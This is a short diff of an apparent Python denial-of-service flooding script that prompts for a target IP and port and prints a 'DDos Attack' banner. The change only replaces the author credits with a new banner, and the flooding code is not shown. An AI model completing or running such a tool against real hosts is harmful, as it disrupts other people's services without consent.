@@ -19,12 +19,18 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack")
-print
-print"Author   : karanlik.onlinee"
-print"You Tube : https://www.youtube.com/c/karanlik.onlinee"
-print"github   : https://github.com/karanlikonlinee"
-print"instagram : https://www.instagram.com/karanlik.onlinee"
-print
+banner="""
+###############################
+# Code by karanlik.online     #
+#                             #
+# Salvadores Team V1          #
+#                             #
+###############################
+İnstgram.com/karanlik.online
+
+"""
+print(banner)
+
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
